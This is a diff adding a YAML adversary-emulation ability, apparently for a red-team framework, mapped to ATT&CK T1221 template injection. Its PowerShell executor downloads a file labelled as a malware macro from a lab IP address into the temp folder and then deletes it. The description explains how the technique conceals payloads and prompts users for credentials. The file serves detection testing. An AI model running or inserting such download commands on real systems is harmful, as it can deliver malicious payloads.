@@ -1,0 +1,38 @@
+- tactic: execution
+  technique_name: 'Template Injection: OLE Exploit'
+  technique_id: T1221
+  name: 'Malware: Download Macro OLE exploit file'
+  description: Adversaries may manipulate document templates, such as those in Office
+    Open XML (OOXML) files or RTF files, to conceal malicious code or trigger authentication
+    attempts. By modifying template properties or control words, they can reference
+    external URLs to download and execute payloads when the document is opened. These
+    attacks can evade detection since no traditional indicators like macros or scripts
+    are present until the payload is fetched. This technique also enables forced authentication
+    by injecting malicious URLs that prompt users for credentials. Such tactics are
+    commonly used in phishing and data exfiltration attacks.
+  executors:
+  - name: psh
+    platform: windows
+    command: "Invoke-WebRequest http://198.18.133.49/malware/macro.xlsm -OutFile $env:TEMP/macro.xlsm;\
+      \ \nStart-Sleep -Seconds 3; \nRemove-Item \"$env:TEMP\\macro.xlsm\" -Force"
+    code: null
+    language: null
+    build_target: null
+    payloads: []
+    uploads: []
+    timeout: 15
+    parsers: []
+    cleanup: []
+    variations: []
+    additional_info: {}
+  requirements: []
+  privilege: ''
+  repeatable: false
+  buckets: []
+  additional_info:
+    cleanup: '[]'
+  access: {}
+  singleton: true
+  plugin: ''
+  delete_payload: true
+  id: b995db4d-fdfa-4a5f-a800-a346b2d3ebb5
